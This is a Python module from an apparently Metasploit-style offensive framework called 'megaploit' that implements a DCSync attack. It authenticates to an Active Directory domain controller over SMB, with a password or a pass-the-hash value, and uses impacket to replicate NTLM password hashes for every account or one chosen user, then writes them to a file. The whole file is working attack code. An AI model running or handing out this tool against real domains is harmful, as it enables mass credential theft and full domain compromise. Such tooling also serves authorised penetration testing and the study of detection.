"""
megaploit.modules.auxiliary.kerberos_dcsync
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
DCSync — replicate password hashes directly from a Domain Controller using
the Directory Replication Service (DRS) protocol without reading SAM/NTDS.DIT.

Requires one of: Domain Admin, Enterprise Admin, or a custom ACE granting
DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on the domain NC.

References
----------
* https://attack.mitre.org/techniques/T1003/006/
* https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync
* https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
"""

from __future__ import annotations

import socket
from megaploit.modules.base import Module, ModuleType, OptionType


class DcSyncModule(Module):
    name        = "auxiliary/kerberos/dcsync"
    description = (
        "DCSync: replicate NTLM hashes from a Domain Controller via DRS "
        "without touching disk (requires Replication rights)"
    )
    module_type = ModuleType.AUXILIARY
    author      = "megaploit"
    references  = [
        "https://attack.mitre.org/techniques/T1003/006/",
        "https://github.com/SecureAuthCorp/impacket",
    ]
    platform    = ["windows", "multi"]; arch = []; rank = 300

    def _define_options(self) -> None:
        self._opt("RHOSTS",   OptionType.ADDRESS, required=True,
                  description="Domain controller IP or hostname")
        self._opt("DOMAIN",   OptionType.STRING,  required=True,
                  description="Active Directory domain (e.g. corp.local)")
        self._opt("USERNAME", OptionType.STRING,  required=True,
                  description="Account with Replication rights")
        self._opt("PASSWORD", OptionType.STRING,  required=False,
                  description="Password (use with cleartext auth)")
        self._opt("NTLM_HASH", OptionType.STRING, required=False,
                  description="LM:NT hash (alternative to PASSWORD)")
        self._opt("TARGET_USER", OptionType.STRING, default="",
                  required=False,
                  description="Dump only this user (blank = all accounts)")
        self._opt("OUTFILE",  OptionType.PATH,    required=False,
                  description="Write hashes to file")
        self._opt("TIMEOUT",  OptionType.INTEGER, default=30, required=False,
                  description="Connection timeout in seconds")

    def check(self, session=None) -> str:
        self.validate()
        host    = str(self.get("RHOSTS"))
        timeout = int(self.get("TIMEOUT"))
        for port in (445, 135):
            try:
                with socket.create_connection((host, port), timeout=timeout):
                    pass
            except OSError as e:
                return f"[-] {host}:{port} — {e}"
        return f"[+] {host} — SMB+RPC ports open (DC likely reachable)"

    def run(self, session=None) -> list:
        self.validate()
        self.results.clear()

        dc          = str(self.get("RHOSTS"))
        domain      = str(self.get("DOMAIN"))
        username    = str(self.get("USERNAME"))
        password    = self.get("PASSWORD") or ""
        ntlm        = self.get("NTLM_HASH") or ""
        target_user = self.get("TARGET_USER") or ""
        outfile     = self.get("OUTFILE") or ""
        timeout     = int(self.get("TIMEOUT"))

        try:
            from impacket.examples.secretsdump import (
                RemoteOperations, NTDSHashes, LocalOperations
            )
            from impacket.smbconnection import SMBConnection
        except (ImportError, OSError):
            return [self._fail("impacket not installed — pip install impacket")]

        # Parse hash if provided
        lmhash_hex = nthash_hex = ""
        if ntlm and ":" in ntlm:
            lmhash_hex, nthash_hex = ntlm.split(":", 1)

        self._emit(f"[*] Connecting to {dc} — domain={domain}  user={username}")

        try:
            smb = SMBConnection(dc, dc, timeout=timeout)
            smb.login(username, password, domain,
                      lmhash=bytes.fromhex(lmhash_hex.zfill(32)) if lmhash_hex else b"",
                      ntHash=bytes.fromhex(nthash_hex.zfill(32)) if nthash_hex else b"")
        except Exception as exc:
            return [self._fail(f"SMB authentication failed: {exc}", dc=dc)]

        self._emit("[*] SMB authenticated — starting DRS replication…")

        collected: list[str] = []

        try:
            remote_ops = RemoteOperations(smb, False, None)
            remote_ops.enableRegistry()

            try:
                bootKey = remote_ops.getBootKey()
            except Exception:
                bootKey = b""

            NTDSFileName = None

            def _cb(secret_type, secret):
                """Called by impacket for each extracted secret."""
                line = str(secret)
                collected.append(line)
                self._emit(f"  {line}")

            NTDS = NTDSHashes(
                NTDSFileName, bootKey,
                isRemote=True,
                history=False,
                noLMHash=True,
                remoteOps=remote_ops,
                useVSSMethod=False,
                justNTLM=True,
            )
            if target_user:
                NTDS.dump(justUser=target_user)
            else:
                NTDS.dump()
            NTDS.export(outfile.rstrip(".") if outfile else "/dev/null")
            remote_ops.finish()
        except Exception as exc:
            self._fail(f"DCSync failed: {exc}", dc=dc)
        finally:
            smb.logoff()

        if collected:
            self._ok(f"DCSync extracted {len(collected)} secret(s)",
                     dc=dc, count=len(collected), hashes=collected[:50])
            if outfile:
                try:
                    import os
                    os.makedirs(os.path.dirname(outfile) or ".", exist_ok=True)
                    with open(outfile, "w") as f:
                        f.write("\n".join(collected) + "\n")
                    self._emit(f"[+] Secrets written to {outfile}")
                except OSError as e:
                    self._emit(f"[-] Write error: {e}")
        else:
            if not any(r.ok for r in self.results):
                self._fail("No hashes extracted", dc=dc)

        return self.results


MODULE = DcSyncModule
